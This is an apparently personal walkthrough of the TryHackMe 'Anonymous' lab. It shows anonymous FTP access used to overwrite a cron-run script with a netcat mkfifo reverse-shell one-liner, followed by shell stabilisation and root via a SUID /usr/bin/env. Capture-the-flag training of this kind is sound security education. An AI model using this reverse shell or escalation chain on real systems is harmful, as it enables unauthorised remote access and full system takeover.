Room: [Anonymous](https://tryhackme.com/room/anonymous)

Difficulty: Medium

Overview: In this room we will take advantage of a missconfigured ftp server in order to modify a script that runs has a cronjob. From there we will exploit SUID binaries to do privilege escalation. 

------------------------------------------------------------------------------------------------------------------------------------------------------------------

We will start enumerating the machine with nmap:

**nmap -sV -sC -A -p anonymous.thm -oN nmap.txt**

![nmap1](https://user-images.githubusercontent.com/76821053/118256768-c30dd800-b4a5-11eb-8835-6cbb9f426a20.png)
![nmap2](https://user-images.githubusercontent.com/76821053/118256851-d7ea6b80-b4a5-11eb-9455-def0bbef6f87.png)

Open ports and their versions running on the remote system:

21    →  vsftpd 2.0.8 

22    →  OpenSSH 7.6p1

139  →  netbios-ssn Samba smbd 3.X - 4.X

445  →  netbios-ssn Samba smbd 4.7.6

From the nmap scan we can imediately answer the first three questions.

Continuing enumerating the machine. 

The ftp server lets us login with user “anonymous” without any password.

![ftpdownload](https://user-images.githubusercontent.com/76821053/118257028-1122db80-b4a6-11eb-90cf-8b198bb70edf.png)

I downloaded three files: **clean.sh**, **removed_files.log**, **to_do.txt**.

**to_do.txt**:

Leaves a hint that the system is not safe. Meaning that maybe some services have anonymous login.

![todo](https://user-images.githubusercontent.com/76821053/118257209-45969780-b4a6-11eb-9215-7690384324ed.png)

**clean.sh**:

Is a bash script that when ran it checks if there is files in the /tmp directory and removes them. 

![readclean](https://user-images.githubusercontent.com/76821053/118257284-5ba45800-b4a6-11eb-9f3e-5db72feed54b.png)

**removed_files.log**:

When the bash script runs it posts status messages to this .log file.

![remotelog](https://user-images.githubusercontent.com/76821053/118257366-75de3600-b4a6-11eb-93e9-5790a2a1c534.png)

If we monitored the **removed_files.log** file we can see that the script **clean.sh** is running has a cronjob since it keeps posting to the .log file everyminute:

If we use "wc -l" we can check how many lines (post messages) the file has.

![remoteWC1](https://user-images.githubusercontent.com/76821053/118257588-b63db400-b4a6-11eb-882b-1693c6c60e0d.png)

After a few minutes we have 72 entries.
 
![remoteWC2](https://user-images.githubusercontent.com/76821053/118257627-c05fb280-b4a6-11eb-8468-1d11bf8a02b3.png)
 
Lets try to upload files to the ftp server:
 
![ftpuploadtest](https://user-images.githubusercontent.com/76821053/118257708-d9686380-b4a6-11eb-9d0e-098654b93554.png)
 
Has we can see the system allows file upload, so lets change the **clean.sh** script a bit and upload it:
 
![cleantest](https://user-images.githubusercontent.com/76821053/118257824-f7ce5f00-b4a6-11eb-8b4f-6e3e435514d6.png)
 
The new message was posted to the .log file after a minute. 
 
![removemessage](https://user-images.githubusercontent.com/76821053/118258135-6ca19900-b4a7-11eb-8c7f-6b00cb9cff3d.png)

This is our way in to the remote target, so lets change the script to run a netcat reverse shell connection.

**rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f**

Change ip and port to match your own system and delete or comment out the rest of the script, because if the script runs the rest of the commands it will delete our tmp files.

![cleannetcat](https://user-images.githubusercontent.com/76821053/118265218-bb076580-b4b0-11eb-84fe-d1d79f532501.png)

Now we just have to be listening with netcat on the port we specify when we upload the new clean.sh file to the ftp server and get a reverse shell connection.

![netcatreverse](https://user-images.githubusercontent.com/76821053/118265304-dffbd880-b4b0-11eb-878d-c77337844df2.png)

Right away we can find the user.txt flag.

![flag1](https://user-images.githubusercontent.com/76821053/118265533-3a953480-b4b1-11eb-9990-d5658b3adbac.png)

It's good practice to stabilize your shell. So we can use tab-completion, Ctrl+C  without completely kills our shell and use su command since it often do not work.

And in a kali machine to do that we will use the following command:

**python -c 'import pty;pty.spawn("/bin/bash")'**

**export TERM=xterm-256-color**

**CTRL + Z**

**stty raw -echo; fg**

![stabilizeshell](https://user-images.githubusercontent.com/76821053/118265726-7fb96680-b4b1-11eb-973b-a63383054857.png)

Now lets try and elevate our privileges and gain root access.

We can use tools like linpeas.sh, but in this case we will do it manually. Since this privilege escalation is a simple one to find.

When enumerating a UNIX base system one of the first things we can do is search for SUID binaries. Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user.  Files that have suid permissions run with higher privileges. 

For example if a file is owned by “root" user and is set to run has a SUID binary. Normal users might take advantage of this permitions to elevate their privileges.

So to check for SUID binaries we can use this command:

**find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;**

![findsuid](https://user-images.githubusercontent.com/76821053/118266231-33baf180-b4b2-11eb-9900-099dc92816fe.png)
![findsuid2](https://user-images.githubusercontent.com/76821053/118266407-7250ac00-b4b2-11eb-85be-5583970bedab.png)

There is a great site called GTFOBins that has a list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

https://gtfobins.github.io/

/usr/bin/env binary is running has root with SUID permitions, so we can exploit it.

![GTFObinenv](https://user-images.githubusercontent.com/76821053/118266632-c6f42700-b4b2-11eb-92f8-da4efdf14a9c.png)

/usr/bin/env /bin/sh -p

![rootflag](https://user-images.githubusercontent.com/76821053/118266812-091d6880-b4b3-11eb-91b8-50146e4390db.png)

Success we found our last flag!




